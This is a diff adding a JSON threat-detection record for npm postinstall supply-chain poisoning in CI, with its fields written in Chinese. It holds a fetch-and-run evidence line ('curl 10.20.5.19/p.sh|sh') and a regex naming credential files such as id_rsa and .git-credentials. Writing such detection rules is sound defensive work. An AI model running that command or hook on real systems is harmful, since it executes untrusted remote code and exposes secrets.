@@ -1,0 +1,102 @@
+{
+  "schema_version": "demo-1.0",
+  "case_id": "CASE-007",
+  "pattern_type": "attack_behavior_pattern",
+  "name": "供应链投毒：npm postinstall 钩子执行远程脚本",
+  "summary": "CI 流水线参数触发依赖安装 → 应用侧记录 postinstall 钩子派生 sh → 主机侧 curl 远程脚本并管道执行。",
+  "pattern_scope": {
+    "attack_family": "供应链 / CI 依赖投毒",
+    "variant_note": "单样本归纳；包名与钩子实现来自该样本，其它包管理器生态未验证。"
+  },
+  "mitre": [
+    "T1195.002",
+    "T1059.004"
+  ],
+  "steps": [
+    {
+      "step_id": "S1",
+      "order": 1,
+      "phase": "initial_access",
+      "action_id": "ci_pipeline_npm_postinstall",
+      "label": "CI 流水线触发依赖安装",
+      "action_regex": "(?i)(?:hook=postinstall|/api/v\\d/pipeline/run)",
+      "expected_sources": [
+        "waf",
+        "web"
+      ],
+      "evidence_patterns": [
+        "hook=postinstall"
+      ],
+      "generic": false
+    },
+    {
+      "step_id": "S2",
+      "order": 2,
+      "phase": "execution",
+      "action_id": "npm_lifecycle_postinstall_spawn",
+      "label": "应用侧 postinstall 派生 shell",
+      "action_regex": "(?i)\\\"npm_lifecycle\\\"\\s*:\\s*\\\"postinstall\\\"",
+      "expected_sources": [
+        "rasp"
+      ],
+      "evidence_patterns": [
+        "{\"npm_lifecycle\": \"postinstall\"}"
+      ],
+      "generic": false
+    },
+    {
+      "step_id": "S3",
+      "order": 3,
+      "phase": "execution",
+      "action_id": "npm_hook_remote_shell",
+      "label": "钩子拉取远程脚本并执行",
+      "action_regex": "(?i)curl\\s+\\S{1,60}/p\\.sh\\|sh",
+      "expected_sources": [
+        "hids"
+      ],
+      "evidence_patterns": [
+        "curl 10.20.5.19/p.sh|sh"
+      ],
+      "generic": false
+    },
+    {
+      "step_id": "S4",
+      "order": 4,
+      "action_id": "fc_ci_execution_variant",
+      "label": "CI 构建期执行/凭据访问变体（FC 家族）",
+      "action_regex": "(?i)setup\\.py|pip install|npm i\\b|mvn\\b|docker|kubectl|terraform|gem (?:build|push)|ci_job_token|runner|agent\\.env|\\.git-credentials|id_rsa|sha256sum|nslookup|git push",
+      "expected_sources": [
+        "hids"
+      ],
+      "generic": true,
+      "required": false
+    }
+  ],
+  "retrieval": {
+    "keywords": [
+      "postinstall",
+      "pipeline/run",
+      "install.js"
+    ],
+    "pattern_probes": [
+      "hook=postinstall",
+      "\\\"npm_lifecycle\\\"\\s*:\\s*\\\"postinstall\\\"",
+      "curl\\s+\\d{1,3}(?:\\.\\d{1,3}){3}/p\\.sh\\|sh"
+    ]
+  },
+  "negative_and_unknown_evidence": {
+    "not_observed": [
+      "凭据外带",
+      "制品投毒"
+    ],
+    "interpretation": "未观察到不等同于确认不存在；需结合日志覆盖范围判断。"
+  },
+  "provenance": {
+    "observation_count": 1,
+    "evidence_status": "single_observation_demo",
+    "observation_count_note": "由 dataset 每类第 1 个 unit 作为首批代表样本入库；原始行保存在 raw_logs.csv。"
+  },
+  "version": 2,
+  "supersedes": 1,
+  "updated_at": "2026-10-27T09:18:33Z"
+}
